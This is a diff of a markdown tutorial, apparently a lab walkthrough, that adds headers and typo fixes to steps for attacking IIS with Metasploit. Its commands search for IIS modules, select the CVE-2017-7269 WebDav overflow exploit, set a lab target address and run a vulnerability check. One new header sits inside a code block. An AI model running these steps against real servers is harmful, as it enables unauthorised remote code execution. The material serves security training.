@@ -179,9 +179,10 @@ This example will a bit different to the other ones, as we will use the _msfcons
 1) Search for IIS-related Metasploit modules (similar to searchsploit)
 2) Select one of them
 3) Set victim IP on the module
-4) Run expoit and get access to the system
+4) Run exploit and gain access to the system
 
-The Metasploit command-line interface will be used on this occasion: _msfconsole_. First, let's use the _search_ command to search for modules that contain the word _iis_:
+### Search for IIS-related Metasploit modules
+First, let's use the _search_ command to search for modules that contain the word _iis_:
 ```
 msf5 > search iis
 
@@ -225,9 +226,12 @@ Matching Modules
 
 It is possible to recognize several exploits and scanners among the Metasploit modules available for IIS servers, take a moment to go through the results descriptions. This time the _Microsoft IIS WebDav ScStoragePathFromUrl Overflow_ exploit will be used (search result number 15 on the list), which is related to the [CVE-2017-7269](https://www.cvedetails.com/cve/CVE-2017-7269/) vulnerability and is also know as "Exploding Can". Note that when successful, the execution of this exploit leads to remote code execution.
 
+### Select an exploit and set its options
 The _use_ command will be used to select the exploit from the list, and _show options_ to get the options that have to be set in order to execute the exploit:
 ```
 msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+
+### Set the module's options
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
 
 Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
@@ -266,6 +270,7 @@ msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.
 RHOSTS => 10.10.10.14
 ```
 
+### Run exploit and gain access
 A really interesting feature of Metasploit modules is that some of them have a _check_ function to verify if the target host is vulnerable:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
